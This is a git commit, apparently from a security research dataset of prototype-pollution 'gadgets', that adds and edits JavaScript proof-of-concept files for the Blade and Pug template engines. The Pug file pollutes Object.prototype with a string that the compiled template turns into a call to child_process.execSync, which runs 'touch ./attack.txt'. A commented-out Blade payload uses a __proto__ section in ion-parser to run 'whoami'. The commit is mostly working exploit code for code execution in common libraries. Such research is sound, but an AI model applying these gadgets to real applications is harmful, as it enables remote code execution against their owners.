30a136f7e1b8c2c60a3216f9332fa85b7a816364
jackfromeast <thisiszhengyu@gmail.com>
2023-02-16 17:00:46 -0500

    add ppgadgets

--- dataset/ppgadgets/bladejs/app.js
+++ dataset/ppgadgets/bladejs/app.js
@@ -1,14 +1,14 @@
 const blade = require('blade');
-const { parse } = require('ion-parser')
-const config = parse(`
-test = 'Hey universe'
+// const { parse } = require('ion-parser')
+// const config = parse(`
+// test = 'Hey universe'
 
-[__proto__.someprop]
-name = "somename"
-value = "somevalue"
-code = "process.mainModule.require('child_process').execSync(\`whoami\`)"
-`)
-console.log(config)
+// [__proto__.someprop]
+// name = "somename"
+// value = "somevalue"
+// code = "process.mainModule.require('child_process').execSync(\`whoami\`)"
+// `)
+// console.log(config)
 
 const template = `html
     head
@@ -21,6 +21,7 @@ const template = `html
                         a(href=nav[i])= i
         #content.center
             h1 Blade is cool`;
+            
 blade.compile(template, {'debug': true}, function(err, tmpl) {
     tmpl({'nav': []}, function(err, html) {
         console.log(html, err);
---
+++ dataset/ppgadgets/pug/app.js
@@ -0,0 +1,33 @@
+pug = require("pug")
+
+/* Payload Injection*/
+// inject property to root prototype
+Object.prototype.asString = '1';
+Object.prototype.name = '2';
+Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"
+
+const template = pug.compile(`h1= msg`);
+
+console.log(template.toString());
+
+
+
+
+// currProp = 'block';
+// Object.defineProperty(
+//     Object.prototype, 
+//     currProp, { 
+//       get: function() { 
+//         if(this[currProp + "cs"]){
+//             return this[currProp + "cs"]; 
+//         }
+//         else{
+//             console.log("block has been visited!");
+//         }
+//         return undefined; 
+//       }, 
+//       set: function(val){ 
+//         this[currProp + "cs"] = val;
+//       } 
+//     }
+//   );
